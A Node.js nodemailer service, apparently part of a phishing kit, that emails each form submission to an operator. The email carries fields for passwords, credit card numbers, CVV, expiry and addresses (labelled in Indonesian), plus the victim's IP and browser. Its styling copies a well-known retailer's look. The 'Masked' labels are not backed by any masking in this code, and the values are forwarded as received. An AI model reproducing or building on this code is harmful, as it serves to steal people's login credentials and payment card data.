const nodemailer = require('nodemailer');
const config = require('../config/config');
const logger = require('../utils/logger');

class EmailService {
    constructor() {
        this.config = config.smtp;
        this.transporter = null;
        this.initialized = this.validateConfig();
        if (this.initialized) {
            this.initTransporter();
        }
    }

    validateConfig() {
        const issues = [];
        if (!this.config.host) issues.push('SMTP_HOST not configured');
        if (!this.config.port) issues.push('SMTP_PORT not configured');
        if (!this.config.user) issues.push('SMTP_USER not configured');
        if (!this.config.pass) issues.push('SMTP_PASS not configured');
        if (!this.config.toAddresses || this.config.toAddresses.length === 0) {
            issues.push('SMTP_TO not configured');
        }
        if (issues.length > 0) {
            logger.warn(`Email service configuration issues: ${issues.join(', ')}`);
            return false;
        }
        return true;
    }

    initTransporter() {
        try {
            this.transporter = nodemailer.createTransport({
                host: this.config.host,
                port: this.config.port,
                secure: this.config.secure,
                auth: {
                    user: this.config.user,
                    pass: this.config.pass,
                },
                requireTLS: !this.config.secure,
                tls: {
                    minVersion: 'TLSv1.2',
                    rejectUnauthorized: true,
                },
                pool: true,
                maxConnections: 5,
                maxMessages: 100,
                rateDelta: 1000,
                rateLimit: 10,
            });
            logger.info(`SMTP transporter initialized: ${this.config.host}:${this.config.port} (secure=${this.config.secure})`);
        } catch (error) {
            logger.error('Failed to initialize SMTP transporter', {
                error: error.message,
                stack: error.stack,
            });
            this.initialized = false;
        }
    }

    isAvailable() {
        return this.initialized && this.transporter !== null;
    }

    formatFieldName(key) {
        const nameMap = {
            email: 'Email',
            password: 'Password (Masked)',
            username: 'Username',
            nama: 'Nama Lengkap',
            name: 'Nama',
            phone: 'No. Telepon',
            telephone: 'No. Telepon',
            hp: 'No. HP',
            alamat: 'Alamat',
            address: 'Alamat',
            kota: 'Kota',
            city: 'Kota',
            provinsi: 'Provinsi',
            negara: 'Negara',
            kodepos: 'Kode Pos',
            zipcode: 'Kode Pos',
            credit_card: 'Kartu Kredit (Masked)',
            card_number: 'No. Kartu (Masked)',
            cc_number: 'No. CC (Masked)',
            cvv: 'CVV (Masked)',
            ccv: 'CCV (Masked)',
            expiry: 'Masa Berlaku',
            amount: 'Jumlah',
            total: 'Total',
            order_id: 'Order ID',
            product: 'Produk',
        };
        const lower = String(key).toLowerCase();
        return nameMap[lower] || this.capitalizeWords(key);
    }

    formatFieldValue(value) {
        if (value === null || value === undefined || value === '') {
            return '<em style="color: #999;">Tidak diisi</em>';
        }
        if (typeof value === 'object') {
            try {
                return '<code>' + this.escapeHtml(JSON.stringify(value)) + '</code>';
            } catch {
                return this.escapeHtml(String(value));
            }
        }
        return this.escapeHtml(String(value));
    }

    capitalizeWords(str) {
        return String(str)
            .replace(/[_-]/g, ' ')
            .replace(/\b\w/g, (c) => c.toUpperCase());
    }

    escapeHtml(text) {
        const map = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#039;',
            '`': '&#x60;',
            '=': '&#x3D;',
        };
        return String(text).replace(/[&<>"'`=]/g, (char) => map[char]);
    }

    generateEmailSubject(submissionId) {
        return `[Form Notification] New Submission Received - ${submissionId}`;
    }

    generateEmailHtml(submissionId, sanitizedData, meta = {}) {
        const timestamp = meta.createdAt || new Date().toLocaleString('id-ID', {
            timeZone: 'Asia/Jakarta',
        });

        let dataRows = '';
        for (const [key, value] of Object.entries(sanitizedData)) {
            dataRows += `
                <tr>
                    <td style="padding: 10px 0; border-bottom: 1px solid #eaeded; font-weight: 700; width: 40%; color: #0f1111; font-family: Arial, sans-serif;">
                        ${this.formatFieldName(key)}
                    </td>
                    <td style="padding: 10px 0; border-bottom: 1px solid #eaeded; color: #0f1111; font-family: Arial, sans-serif;">
                        ${this.formatFieldValue(value)}
                    </td>
                </tr>
            `;
        }

        let metaRows = '';
        if (meta.clientIp || meta.userAgent) {
            metaRows = `
                <table width="100%" cellpadding="0" cellspacing="0" style="font-size: 14px; line-height: 1.5; margin-top: 20px;">
                    <tr>
                        <td colspan="2" style="padding: 10px 0 5px 0;">
                            <strong style="color: #0f1111; font-family: Arial, sans-serif;">Technical Details:</strong>
                        </td>
                    </tr>
            `;
            if (meta.clientIp) {
                metaRows += `
                    <tr>
                        <td style="padding: 8px 0; border-bottom: 1px solid #eaeded; width: 40%; color: #565959; font-family: Arial, sans-serif;">IP Address</td>
                        <td style="padding: 8px 0; border-bottom: 1px solid #eaeded; color: #565959; font-family: Arial, sans-serif;">${this.escapeHtml(meta.clientIp)}</td>
                    </tr>
                `;
            }
            if (meta.userAgent && meta.userAgent !== 'unknown') {
                metaRows += `
                    <tr>
                        <td style="padding: 8px 0; border-bottom: 1px solid #eaeded; color: #565959; font-family: Arial, sans-serif;">Device/Browser</td>
                        <td style="padding: 8px 0; border-bottom: 1px solid #eaeded; font-size: 13px; color: #565959; font-family: Arial, sans-serif;">${this.escapeHtml(meta.userAgent)}</td>
                    </tr>
                `;
            }
            metaRows += `</table>`;
        }

        return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Notification</title>
</head>
<body style="margin: 0; padding: 0; font-family: Arial, sans-serif; background-color: #f9f9f9; color: #333333;">
    <div style="max-width: 600px; margin: 20px auto; padding: 20px; background-color: #ffffff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
        
        <!-- Header -->
        <div style="padding-bottom: 15px; border-bottom: 2px solid #0056b3; text-align: left;">
            <h1 style="margin: 0; color: #0056b3; font-size: 24px;">System Alert</h1>
        </div>

        <!-- Body -->
        <div style="padding: 20px 0;">
            <h2 style="font-size: 20px; font-weight: normal; margin: 0 0 20px 0; color: #333333;">
                New Form Submission Detected
            </h2>
            <p style="font-size: 15px; line-height: 1.6; margin: 0 0 15px 0;">
                Hello Admin,
            </p>
            <p style="font-size: 15px; line-height: 1.6; margin: 0 0 25px 0;">
                A new submission has been received by the Form Notification System. Details are below:
            </p>

            <div style="border: 1px solid #dddddd; border-radius: 8px; padding: 20px; background-color: #fafafa;">
                <p style="margin: 0 0 10px 0; font-size: 14px; color: #555555;">
                    <strong>Submission ID:</strong> <span style="color: #222222;">${submissionId}</span>
                </p>
                <p style="margin: 0 0 20px 0; font-size: 14px; color: #555555;">
                    <strong>Date/Time:</strong> <span style="color: #222222;">${this.escapeHtml(timestamp)}</span>
                </p>
                
                <table width="100%" cellpadding="0" cellspacing="0" style="font-size: 14px; line-height: 1.5; margin-bottom: 10px;">
                    ${dataRows}
                </table>

                ${metaRows}
            </div>
        </div>

        <!-- Footer -->
        <div style="margin-top: 30px; padding-top: 20px; border-top: 1px solid #eaeaea; text-align: center; font-size: 12px; color: #888888; line-height: 1.5;">
            <p style="margin: 0;">
                This is an automated notification from your Form Notification System.<br>
                Please do not reply to this email.
            </p>
        </div>

    </div>
</body>
</html>`;
    }

    generateEmailText(submissionId, sanitizedData, meta = {}) {
        const timestamp = meta.createdAt || new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
        const lines = [];
        lines.push('NOTIFIKASI SUBMIT BARU');
        lines.push('=' .repeat(50));
        lines.push(`ID Submit : ${submissionId}`);
        lines.push(`Waktu     : ${timestamp}`);
        lines.push('');
        lines.push('Detail Data Pengguna:');
        lines.push('-'.repeat(50));
        for (const [key, value] of Object.entries(sanitizedData)) {
            const displayValue = (value === null || value === undefined || value === '') ? '[Tidak diisi]' : String(value);
            lines.push(`${this.formatFieldName(key)}: ${displayValue}`);
        }
        lines.push('');
        if (meta.clientIp) lines.push(`IP Pengirim: ${meta.clientIp}`);
        if (meta.userAgent && meta.userAgent !== 'unknown') lines.push(`User Agent: ${meta.userAgent}`);
        lines.push('');
        lines.push('-'.repeat(50));
        lines.push('Sistem Notifikasi Otomatis');
        return lines.join('\n');
    }

    async sendEmail(submissionId, sanitizedData, meta = {}) {
        if (!this.isAvailable()) {
            const error = new Error('Email service is not configured (missing SMTP credentials)');
            logger.warn('Email send skipped: not configured', { submission_id: submissionId });
            return { success: false, skipped: true, error: error.message };
        }

        try {
            const subject = this.generateEmailSubject(submissionId);
            const html = this.generateEmailHtml(submissionId, sanitizedData, meta);
            const text = this.generateEmailText(submissionId, sanitizedData, meta);

            const randomPart = Math.random().toString(36).slice(2, 12);
            const timestamp = Date.now();
            const senderDomain = this.config.user.split('@')[1] || 'localhost';

            const mailOptions = {
                from: `"${this.config.fromName}" <${this.config.user}>`,
                to: this.config.toAddresses.join(', '),
                subject: subject,
                text: text,
                html: html,
                priority: 'normal',
                encoding: 'utf-8',
                textEncoding: 'base64',
                messageId: `<fns-${timestamp}-${randomPart}@${senderDomain}>`,
                inReplyTo: undefined,
                references: undefined,
                replyTo: this.config.user,
                headers: {
                    'X-Notification-Submission-ID': submissionId,
                    'X-Mailer': 'Form-Notification-System/1.0',
                    'X-Auto-Response-Suppress': 'All',
                    'X-Priority': '3',
                    'Precedence': 'bulk',
                    'Auto-Submitted': 'auto-generated',
                    'Content-Language': 'en-US, id-ID',
                },
            };

            const result = await this.transporter.sendMail(mailOptions);
            logger.info(`Email notification sent to ${this.config.toAddresses.join(', ')}`, {
                submission_id: submissionId,
                message_id: result.messageId,
                accepted: result.accepted,
                rejected: result.rejected,
            });

            return {
                success: true,
                skipped: false,
                messageId: result.messageId,
                accepted: result.accepted,
                rejected: result.rejected,
                response: result.response,
            };
        } catch (error) {
            logger.error('Email send exception', {
                submission_id: submissionId,
                error: error.message,
                stack: error.stack,
                code: error.code,
                command: error.command,
            });
            return {
                success: false,
                skipped: false,
                error: error.message,
                code: error.code,
            };
        }
    }

    async testConnection() {
        if (!this.isAvailable()) {
            return { success: false, error: 'Email service not configured' };
        }
        try {
            await this.transporter.verify();
            return { success: true, info: 'SMTP connection verified successfully' };
        } catch (error) {
            return { success: false, error: error.message, code: error.code };
        }
    }

    async close() {
        if (this.transporter) {
            try {
                this.transporter.close();
                logger.info('SMTP transporter closed');
            } catch (error) {
                logger.error('Error closing SMTP transporter', { error: error.message });
            }
        }
    }
}

const emailService = new EmailService();
module.exports = emailService;
